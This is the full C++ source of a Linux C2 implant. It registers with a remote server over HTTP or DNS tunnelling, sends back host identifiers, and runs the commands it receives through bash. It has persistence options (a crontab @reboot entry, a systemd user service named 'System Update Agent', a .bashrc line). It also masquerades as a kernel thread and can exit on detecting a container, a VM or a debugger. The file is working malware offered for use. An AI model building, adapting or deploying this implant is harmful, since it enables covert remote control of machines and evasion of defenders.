// ═══════════════════════════════════════════════════════════════════════
//  C2 Client — Linux native (C++17, links against libcurl)
//
//  Build:
//    g++ -std=c++17 -O2 -o c2client main.cpp -lcurl -lpthread
//    strip c2client
//
//  Run:
//    ./c2client --server 10.0.0.1:8000 --interval 10 --persist crontab
// ═══════════════════════════════════════════════════════════════════════

#include <algorithm>
#include <array>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <iostream>
#include <memory>
#include <random>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#include <arpa/inet.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pwd.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <linux/limits.h>
#include <unistd.h>

#include <curl/curl.h>

// Build-time defaults — override with:
//   g++ -DC2_DEFAULT_SERVER='"10.0.0.1:8000"' -DC2_DEFAULT_INTERVAL=10 ...
#ifndef C2_DEFAULT_SERVER
#define C2_DEFAULT_SERVER "127.0.0.1:8000"
#endif
#ifndef C2_DEFAULT_INTERVAL
#define C2_DEFAULT_INTERVAL 10
#endif
#ifndef C2_DEFAULT_JITTER
#define C2_DEFAULT_JITTER 0.3
#endif
#ifndef C2_DEFAULT_CHANNEL
#define C2_DEFAULT_CHANNEL "http"
#endif
#ifndef C2_DEFAULT_DNS_DOMAIN
#define C2_DEFAULT_DNS_DOMAIN "c2.local"
#endif
#ifndef C2_DEFAULT_DNS_PORT
#define C2_DEFAULT_DNS_PORT 15353
#endif

static const int DNS_CHUNK_SIZE = 50;

// ── Helpers ──────────────────────────────────────────────────────────

static size_t curl_write_cb(void *data, size_t size, size_t nmemb, void *userp)
{
    auto *buf = static_cast<std::string *>(userp);
    buf->append(static_cast<char *>(data), size * nmemb);
    return size * nmemb;
}

// Minimal JSON helpers (no dependency on nlohmann/json)
static std::string json_escape(const std::string &s)
{
    std::string out;
    out.reserve(s.size() + 8);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:   out += c;
        }
    }
    return out;
}

static std::string json_get(const std::string &json, const std::string &key)
{
    // Extracts value for "key":"value" or "key": "value"
    // Handles JSON escape sequences (\" \\ \n \t etc.)
    auto needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return "";
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return "";

    // Walk forward from opening quote, respecting backslash escapes
    std::string result;
    size_t i = pos + 1;
    while (i < json.size()) {
        char c = json[i];
        if (c == '"') break;           // unescaped closing quote
        if (c == '\\' && i + 1 < json.size()) {
            char next = json[i + 1];
            switch (next) {
                case '"':  result += '"';  break;
                case '\\': result += '\\'; break;
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                case '/':  result += '/';  break;
                default:   result += '\\'; result += next; break;
            }
            i += 2;
        } else {
            result += c;
            ++i;
        }
    }
    return result;
}

// Find the matching '}' for a '{' at position start, skipping over JSON strings
static size_t json_find_object_end(const std::string &json, size_t start)
{
    int depth = 0;
    bool in_string = false;
    for (size_t i = start; i < json.size(); ++i) {
        char c = json[i];
        if (in_string) {
            if (c == '\\') { ++i; continue; }  // skip escaped char
            if (c == '"') in_string = false;
        } else {
            if (c == '"') in_string = true;
            else if (c == '{') ++depth;
            else if (c == '}') { --depth; if (depth == 0) return i; }
        }
    }
    return std::string::npos;
}

// Extract command entries from beacon JSON: {"commands":[{"id":"...","command":"..."},..]}
struct CmdEntry { std::string id; std::string command; };
static std::vector<CmdEntry> parse_commands(const std::string &json)
{
    std::vector<CmdEntry> out;
    // Start from the "[" array bracket to skip the outer { }
    size_t pos = json.find('[');
    if (pos == std::string::npos) return out;
    while (true) {
        pos = json.find('{', pos);
        if (pos == std::string::npos) break;
        auto end = json_find_object_end(json, pos);
        if (end == std::string::npos) break;
        auto block = json.substr(pos, end - pos + 1);
        auto id  = json_get(block, "id");
        auto cmd = json_get(block, "command");
        if (!id.empty() && !cmd.empty())
            out.push_back({id, cmd});
        pos = end + 1;
    }
    return out;
}

// ── Base64 ──────────────────────────────────────────────────────────

static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const char b64url_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

static std::string base64_encode(const std::string &in, bool urlsafe = false)
{
    const char *tbl = urlsafe ? b64url_table : b64_table;
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(tbl[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(tbl[((val << 8) >> (valb + 8)) & 0x3F]);
    // No padding for urlsafe
    if (!urlsafe)
        while (out.size() % 4) out.push_back('=');
    return out;
}

static std::string base64_decode(const std::string &in)
{
    // Build decode table supporting both standard and urlsafe
    int T[256];
    std::memset(T, -1, sizeof(T));
    for (int i = 0; i < 64; ++i) { T[(int)b64_table[i]] = i; T[(int)b64url_table[i]] = i; }

    std::string out;
    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) continue;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) { out.push_back(char((val >> valb) & 0xFF)); valb -= 8; }
    }
    return out;
}

// ── DNS helpers ─────────────────────────────────────────────────────

static std::vector<uint8_t> dns_build_query(const std::string &qname, uint16_t qtype = 16)
{
    std::vector<uint8_t> pkt;
    // Transaction ID (random)
    uint16_t txn = (uint16_t)(rand() & 0xFFFF);
    pkt.push_back(txn >> 8); pkt.push_back(txn & 0xFF);
    // Flags: standard query, RD=1
    pkt.push_back(0x01); pkt.push_back(0x00);
    // QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0
    pkt.push_back(0x00); pkt.push_back(0x01);
    pkt.push_back(0x00); pkt.push_back(0x00);
    pkt.push_back(0x00); pkt.push_back(0x00);
    pkt.push_back(0x00); pkt.push_back(0x00);
    // QNAME
    std::istringstream iss(qname);
    std::string label;
    while (std::getline(iss, label, '.')) {
        pkt.push_back((uint8_t)label.size());
        for (char c : label) pkt.push_back((uint8_t)c);
    }
    pkt.push_back(0x00);
    // QTYPE, QCLASS IN
    pkt.push_back(qtype >> 8); pkt.push_back(qtype & 0xFF);
    pkt.push_back(0x00); pkt.push_back(0x01);
    return pkt;
}

static std::vector<std::string> dns_parse_txt(const uint8_t *data, size_t len)
{
    std::vector<std::string> results;
    if (len < 12) return results;
    uint16_t qdcount = (data[4] << 8) | data[5];
    uint16_t ancount = (data[6] << 8) | data[7];

    // Skip header + question section
    size_t off = 12;
    for (uint16_t q = 0; q < qdcount; ++q) {
        while (off < len) {
            uint8_t l = data[off];
            if (l == 0) { off++; break; }
            if (l >= 0xC0) { off += 2; break; }
            off += 1 + l;
        }
        off += 4; // QTYPE + QCLASS
    }

    // Parse answer RRs
    for (uint16_t a = 0; a < ancount; ++a) {
        if (off >= len) break;
        // Skip NAME
        if (data[off] >= 0xC0) off += 2;
        else { while (off < len && data[off] != 0) off += 1 + data[off]; off++; }

        if (off + 10 > len) break;
        uint16_t rtype = (data[off] << 8) | data[off+1];
        uint16_t rdlength = (data[off+8] << 8) | data[off+9];
        off += 10;

        if (rtype == 16) { // TXT
            size_t end = off + rdlength;
            size_t pos = off;
            while (pos < end && pos < len) {
                uint8_t slen = data[pos++];
                if (pos + slen > len) break;
                results.emplace_back((const char*)&data[pos], slen);
                pos += slen;
            }
        }
        off += rdlength;
    }
    return results;
}

static std::vector<std::string> dns_query(const std::string &qname, const std::string &server_ip, int port, int retries = 3)
{
    auto pkt = dns_build_query(qname);
    for (int attempt = 0; attempt < retries; ++attempt) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        struct timeval tv = {10, 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        struct sockaddr_in srv{};
        srv.sin_family = AF_INET;
        srv.sin_port = htons(port);
        inet_pton(AF_INET, server_ip.c_str(), &srv.sin_addr);
        sendto(sock, pkt.data(), pkt.size(), 0, (struct sockaddr*)&srv, sizeof(srv));
        uint8_t buf[4096];
        ssize_t n = recvfrom(sock, buf, sizeof(buf), 0, nullptr, nullptr);
        close(sock);
        if (n > 0) return dns_parse_txt(buf, (size_t)n);
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
    return {};
}

// ── HTTP client (libcurl) ────────────────────────────────────────────

class Http {
public:
    static std::string post(const std::string &url, const std::string &body, int retries = 3)
    {
        std::string response;
        for (int attempt = 0; attempt < retries; ++attempt) {
            response.clear();
            CURL *curl = curl_easy_init();
            if (!curl) continue;
            struct curl_slist *hdrs = nullptr;
            hdrs = curl_slist_append(hdrs, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdrs);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
            curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
            auto res = curl_easy_perform(curl);
            curl_slist_free_all(hdrs);
            curl_easy_cleanup(curl);
            if (res == CURLE_OK) return response;
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
        return "";
    }

    static std::string get(const std::string &url, int retries = 3)
    {
        std::string response;
        for (int attempt = 0; attempt < retries; ++attempt) {
            response.clear();
            CURL *curl = curl_easy_init();
            if (!curl) continue;
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
            curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
            auto res = curl_easy_perform(curl);
            curl_easy_cleanup(curl);
            if (res == CURLE_OK) return response;
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
        return "";
    }
};

// ── System information ───────────────────────────────────────────────

namespace SysInfo {

std::string hostname()
{
    char buf[256] = {};
    gethostname(buf, sizeof(buf));
    return buf;
}

std::string os_info()
{
    struct utsname u = {};
    uname(&u);
    return std::string("Linux ") + u.release;
}

std::string local_ip()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return "127.0.0.1";
    struct sockaddr_in srv{};
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(80);
    inet_pton(AF_INET, "8.8.8.8", &srv.sin_addr);
    connect(sock, (struct sockaddr *)&srv, sizeof(srv));
    struct sockaddr_in local{};
    socklen_t len = sizeof(local);
    getsockname(sock, (struct sockaddr *)&local, &len);
    close(sock);
    char ip[INET_ADDRSTRLEN] = {};
    inet_ntop(AF_INET, &local.sin_addr, ip, sizeof(ip));
    return ip;
}

std::string mac_address()
{
    struct ifaddrs *ifa = nullptr;
    if (getifaddrs(&ifa) != 0) return "00:00:00:00:00:00";
    // Find first non-loopback interface with a HW addr
    for (auto *p = ifa; p; p = p->ifa_next) {
        if (!p->ifa_addr || p->ifa_addr->sa_family != AF_PACKET) continue;
        if (p->ifa_flags & IFF_LOOPBACK) continue;
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        struct ifreq ifr{};
        strncpy(ifr.ifr_name, p->ifa_name, IFNAMSIZ - 1);
        if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
            close(fd);
            freeifaddrs(ifa);
            auto *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
            char buf[18];
            snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
                     mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
            return buf;
        }
        close(fd);
    }
    freeifaddrs(ifa);
    return "00:00:00:00:00:00";
}

} // namespace SysInfo

// ── Command execution ────────────────────────────────────────────────

std::string exec_command(const std::string &cmd, int timeout_sec = 300)
{
    // Fork + exec via /bin/bash -c "<cmd>"
    int pipefd[2];
    if (pipe(pipefd) != 0) return "[ERROR] pipe() failed";

    pid_t pid = fork();
    if (pid < 0) return "[ERROR] fork() failed";

    if (pid == 0) {
        // Child
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execl("/bin/bash", "bash", "-c", cmd.c_str(), (char *)nullptr);
        _exit(127);
    }

    // Parent
    close(pipefd[1]);
    std::string output;
    char buf[4096];
    ssize_t n;
    // Non-blocking read with timeout
    auto start = std::chrono::steady_clock::now();
    while ((n = read(pipefd[0], buf, sizeof(buf))) > 0) {
        output.append(buf, n);
        auto elapsed = std::chrono::steady_clock::now() - start;
        if (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count() > timeout_sec) {
            kill(pid, SIGKILL);
            output += "\n[ERROR] Command timed out";
            break;
        }
    }
    close(pipefd[0]);

    int status = 0;
    waitpid(pid, &status, 0);

    // Trim trailing whitespace
    while (!output.empty() && (output.back() == '\n' || output.back() == '\r'))
        output.pop_back();
    return output;
}

// ── Persistence ──────────────────────────────────────────────────────

namespace Persist {

bool crontab(const std::string &self_path)
{
    std::string existing = exec_command("crontab -l 2>/dev/null");
    std::string entry = "@reboot " + self_path + " &";
    if (existing.find(entry) != std::string::npos) return true;
    std::string new_cron = existing + "\n" + entry + "\n";
    // Write to temp file to avoid shell injection via special chars in paths
    std::string tmp = "/tmp/.cron_" + std::to_string(getpid());
    {
        std::ofstream f(tmp);
        if (!f) return false;
        f << new_cron;
    }
    exec_command("crontab " + tmp);
    unlink(tmp.c_str());
    return true;
}

bool systemd_user(const std::string &self_path)
{
    auto home = std::string(getenv("HOME") ? getenv("HOME") : "/tmp");
    auto dir  = home + "/.config/systemd/user";
    exec_command("mkdir -p " + dir);
    std::ofstream f(dir + "/system-update-agent.service");
    if (!f) return false;
    f << "[Unit]\n"
         "Description=System Update Agent\n"
         "After=network-online.target\n\n"
         "[Service]\n"
         "ExecStart=" << self_path << "\n"
         "Restart=always\n"
         "RestartSec=30\n\n"
         "[Install]\n"
         "WantedBy=default.target\n";
    f.close();
    exec_command("systemctl --user daemon-reload");
    exec_command("systemctl --user enable --now system-update-agent.service");
    return true;
}

bool bashrc(const std::string &self_path)
{
    auto home = std::string(getenv("HOME") ? getenv("HOME") : "/tmp");
    auto rc   = home + "/.bashrc";
    std::string marker = "# c2-agent";
    {
        std::ifstream in(rc);
        std::string contents((std::istreambuf_iterator<char>(in)), {});
        if (contents.find(marker) != std::string::npos) return true;
    }
    std::ofstream out(rc, std::ios::app);
    out << "\n(nohup " << self_path << " &>/dev/null &) " << marker << "\n";
    return true;
}

} // namespace Persist

// ── Anti-analysis ────────────────────────────────────────────────────

namespace AntiAnalysis {

bool is_container()
{
    // /.dockerenv
    if (access("/.dockerenv", F_OK) == 0) return true;

    // cgroup check
    std::ifstream cg("/proc/1/cgroup");
    if (cg) {
        std::string line;
        while (std::getline(cg, line)) {
            if (line.find("docker") != std::string::npos ||
                line.find("lxc")    != std::string::npos ||
                line.find("kubepods") != std::string::npos)
                return true;
        }
    }

    // DMI
    std::ifstream dmi("/sys/class/dmi/id/product_name");
    if (dmi) {
        std::string product;
        std::getline(dmi, product);
        for (auto &c : product) c = tolower(c);
        for (auto &k : {"virtualbox", "vmware", "kvm", "qemu", "xen"})
            if (product.find(k) != std::string::npos) return true;
    }
    return false;
}

bool is_traced()
{
    std::ifstream f("/proc/self/status");
    std::string line;
    while (std::getline(f, line)) {
        if (line.find("TracerPid:") != std::string::npos) {
            auto pid = line.substr(line.find(':') + 1);
            pid.erase(0, pid.find_first_not_of(" \t"));
            return pid != "0";
        }
    }
    return false;
}

} // namespace AntiAnalysis

// ── Process masquerade ───────────────────────────────────────────────

void masquerade(const char *name = "[kworker/0:2-events]")
{
    prctl(PR_SET_NAME, name, 0, 0, 0);
}

// ── Agent (abstract) ────────────────────────────────────────────────

class Agent {
protected:
    int         interval_ms_;
    double      jitter_;
    std::mt19937 rng_{std::random_device{}()};

public:
    Agent(int interval_sec, double jitter)
        : interval_ms_(interval_sec * 1000), jitter_(jitter) {}
    virtual ~Agent() = default;
    virtual std::string description() const = 0;
    virtual std::string do_register() = 0;
    virtual std::vector<CmdEntry> beacon(const std::string &target_id) = 0;
    virtual void report(const std::string &target_id, const std::string &cmd_id, const std::string &output) = 0;

    [[noreturn]] void run()
    {
        std::cout << "[*] C2 Client (C++) — " << description() << std::endl;

        // Registration loop
        std::string target_id;
        while (target_id.empty()) {
            std::cout << "[*] Registering ..." << std::endl;
            target_id = do_register();
            if (!target_id.empty()) {
                std::cout << "[+] Registered as " << target_id << std::endl;
            } else {
                std::cout << "[-] Registration failed, retrying ..." << std::endl;
                std::this_thread::sleep_for(std::chrono::milliseconds(interval_ms_));
            }
        }

        // Beacon loop
        std::uniform_real_distribution<double> dist(-jitter_, jitter_);
        while (true) {
            try {
                auto commands = beacon(target_id);
                for (auto &cmd : commands) {
                    std::cout << "[>] Executing " << cmd.id.substr(0, 8) << "..." << std::endl;
                    auto output = exec_command(cmd.command);
                    std::cout << "[<] Result (" << output.size() << " bytes)" << std::endl;
                    report(target_id, cmd.id, output);
                }
            } catch (const std::exception &e) {
                std::cerr << "[-] Beacon error: " << e.what() << std::endl;
            }

            double factor = 1.0 + dist(rng_);
            int sleep_ms = std::max(1000, static_cast<int>(interval_ms_ * factor));
            std::this_thread::sleep_for(std::chrono::milliseconds(sleep_ms));
        }
    }
};

// ── HTTP Agent ──────────────────────────────────────────────────────

class HttpAgent : public Agent {
    std::string base_url_;

public:
    HttpAgent(const std::string &server, int interval_sec, double jitter)
        : Agent(interval_sec, jitter)
        , base_url_("http://" + server + "/api/v1/agent") {}

    std::string description() const override { return "HTTP channel → " + base_url_; }

    std::string do_register() override
    {
        std::string body = "{\"hostname\":\"" + json_escape(SysInfo::hostname())
            + "\",\"ip_address\":\"" + json_escape(SysInfo::local_ip())
            + "\",\"mac_address\":\"" + json_escape(SysInfo::mac_address())
            + "\",\"os\":\"" + json_escape(SysInfo::os_info())
            + "\",\"communication_channel\":\"http\"}";
        auto resp = Http::post(base_url_ + "/register", body);
        return json_get(resp, "target_id");
    }

    std::vector<CmdEntry> beacon(const std::string &target_id) override
    {
        auto resp = Http::get(base_url_ + "/" + target_id + "/commands");
        if (resp.empty()) return {};
        return parse_commands(resp);
    }

    void report(const std::string &target_id, const std::string &cmd_id, const std::string &output) override
    {
        std::string body = "{\"output\":\"" + json_escape(output) + "\"}";
        Http::post(base_url_ + "/" + target_id + "/commands/" + cmd_id + "/result", body);
    }
};

// ── DNS Agent ───────────────────────────────────────────────────────

class DnsAgent : public Agent {
    std::string server_ip_;
    int         port_;
    std::string domain_;

public:
    DnsAgent(const std::string &server_ip, int port, const std::string &domain,
             int interval_sec, double jitter)
        : Agent(interval_sec, jitter)
        , server_ip_(server_ip), port_(port), domain_(domain) {}

    std::string description() const override
    {
        return "DNS channel → " + server_ip_ + ":" + std::to_string(port_) + " domain=" + domain_;
    }

    std::string do_register() override
    {
        std::string json_body = "{\"hostname\":\"" + json_escape(SysInfo::hostname())
            + "\",\"ip_address\":\"" + json_escape(SysInfo::local_ip())
            + "\",\"mac_address\":\"" + json_escape(SysInfo::mac_address())
            + "\",\"os\":\"" + json_escape(SysInfo::os_info())
            + "\",\"communication_channel\":\"dns\"}";
        std::string b64 = base64_encode(json_body, true);

        // Split into chunks
        std::vector<std::string> chunks;
        for (size_t i = 0; i < b64.size(); i += DNS_CHUNK_SIZE)
            chunks.push_back(b64.substr(i, DNS_CHUNK_SIZE));
        if (chunks.empty()) chunks.push_back("");
        int total = (int)chunks.size();

        // Send all chunks except last (ACK only)
        for (int i = 0; i < total - 1; ++i) {
            std::string qname = chunks[i] + "." + std::to_string(i) + "." + std::to_string(total) + ".reg." + domain_;
            dns_query(qname, server_ip_, port_);
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
        }

        // Send last chunk — response contains target_id
        int last = total - 1;
        std::string qname = chunks[last] + "." + std::to_string(last) + "." + std::to_string(total) + ".reg." + domain_;
        auto txts = dns_query(qname, server_ip_, port_);
        if (txts.empty()) return "";

        std::string b64_resp;
        for (auto &t : txts) b64_resp += t;
        try {
            auto decoded = base64_decode(b64_resp);
            return json_get(decoded, "target_id");
        } catch (...) { return ""; }
    }

    std::vector<CmdEntry> beacon(const std::string &target_id) override
    {
        std::string qname = target_id + ".poll." + domain_;
        auto txts = dns_query(qname, server_ip_, port_);
        if (txts.empty()) return {};

        std::string b64_data;
        for (auto &t : txts) b64_data += t;
        std::string payload;
        try { payload = base64_decode(b64_data); }
        catch (...) { return {}; }

        auto id = json_get(payload, "id");
        if (id.empty()) return {};
        auto cmd = json_get(payload, "command");
        return {{id, cmd}};
    }

    void report(const std::string &target_id, const std::string &cmd_id, const std::string &output) override
    {
        (void)target_id;
        std::string b64 = base64_encode(output, true);
        std::vector<std::string> chunks;
        for (size_t i = 0; i < b64.size(); i += DNS_CHUNK_SIZE)
            chunks.push_back(b64.substr(i, DNS_CHUNK_SIZE));
        if (chunks.empty()) chunks.push_back("");
        int total = (int)chunks.size();

        for (int i = 0; i < total; ++i) {
            std::string qname = chunks[i] + "." + std::to_string(i) + "." + std::to_string(total) + "." + cmd_id + ".res." + domain_;
            dns_query(qname, server_ip_, port_);
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
        }
    }
};

// ── Main ─────────────────────────────────────────────────────────────

static void print_usage()
{
    std::cout << R"(c2client — Linux native C2 implant (C++)

Options:
  -s, --server <host:port>   C2 server (default: 127.0.0.1:8000)
  -i, --interval <sec>       Beacon interval (default: 10)
  -j, --jitter <0-1>         Jitter factor (default: 0.3)
  -c, --channel <http|dns>   Communication channel (default: http)
  --dns-domain <domain>       DNS C2 domain (default: c2.local)
  --dns-port <port>           DNS server port (default: 15353)
  --persist <method>          none | crontab | systemd | bashrc
  --masquerade                Rename process to kernel thread name
  --container-check           Exit if container/VM detected
  --trace-check               Exit if ptrace debugger attached

Build:
  g++ -std=c++17 -O2 -o c2client main.cpp -lcurl -lpthread
  strip c2client
)" << std::endl;
}

int main(int argc, char *argv[])
{
    curl_global_init(CURL_GLOBAL_ALL);

    // Resolve: env var C2_SERVER > compile-time define > hardcoded fallback
    const char *env_server = std::getenv("C2_SERVER");
    std::string server   = env_server ? env_server : C2_DEFAULT_SERVER;
    int         interval = C2_DEFAULT_INTERVAL;
    double      jitter   = C2_DEFAULT_JITTER;
    std::string channel  = C2_DEFAULT_CHANNEL;
    std::string dns_domain = C2_DEFAULT_DNS_DOMAIN;
    int         dns_port = C2_DEFAULT_DNS_PORT;
    std::string persist  = "none";
    bool        do_masq  = false;
    bool        cont_chk = false;
    bool        trace_chk = false;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if ((arg == "-s" || arg == "--server")   && i+1 < argc) server   = argv[++i];
        else if ((arg == "-i" || arg == "--interval") && i+1 < argc) interval = std::atoi(argv[++i]);
        else if ((arg == "-j" || arg == "--jitter")   && i+1 < argc) jitter   = std::atof(argv[++i]);
        else if ((arg == "-c" || arg == "--channel")  && i+1 < argc) channel  = argv[++i];
        else if (arg == "--dns-domain" && i+1 < argc) dns_domain = argv[++i];
        else if (arg == "--dns-port"   && i+1 < argc) dns_port = std::atoi(argv[++i]);
        else if (arg == "--persist"    && i+1 < argc) persist  = argv[++i];
        else if (arg == "--masquerade") do_masq   = true;
        else if (arg == "--container-check") cont_chk  = true;
        else if (arg == "--trace-check")     trace_chk = true;
        else if (arg == "-h" || arg == "--help") { print_usage(); return 0; }
    }

    // Anti-analysis
    if (cont_chk && AntiAnalysis::is_container()) {
        std::cout << "[!] Container/VM detected — exiting" << std::endl;
        return 0;
    }
    if (trace_chk && AntiAnalysis::is_traced()) {
        std::cout << "[!] Tracer detected — exiting" << std::endl;
        return 0;
    }

    // Masquerade
    if (do_masq) masquerade();

    // Persistence
    std::string self_path = argv[0];
    // Resolve to absolute path if relative
    if (self_path[0] != '/') {
        char rp[PATH_MAX] = {};
        if (realpath(argv[0], rp)) self_path = rp;
    }

    if (persist == "crontab")       { Persist::crontab(self_path);       std::cout << "[+] Persistence: crontab" << std::endl; }
    else if (persist == "systemd")  { Persist::systemd_user(self_path);  std::cout << "[+] Persistence: systemd user" << std::endl; }
    else if (persist == "bashrc")   { Persist::bashrc(self_path);        std::cout << "[+] Persistence: bashrc" << std::endl; }

    // Run
    std::unique_ptr<Agent> agent;
    if (channel == "dns") {
        // Extract IP from server (strip port if present)
        std::string ip = server;
        auto colon = ip.find(':');
        if (colon != std::string::npos) ip = ip.substr(0, colon);
        agent = std::make_unique<DnsAgent>(ip, dns_port, dns_domain, interval, jitter);
    } else {
        agent = std::make_unique<HttpAgent>(server, interval, jitter);
    }
    agent->run();

    curl_global_cleanup();
    return 0;
}
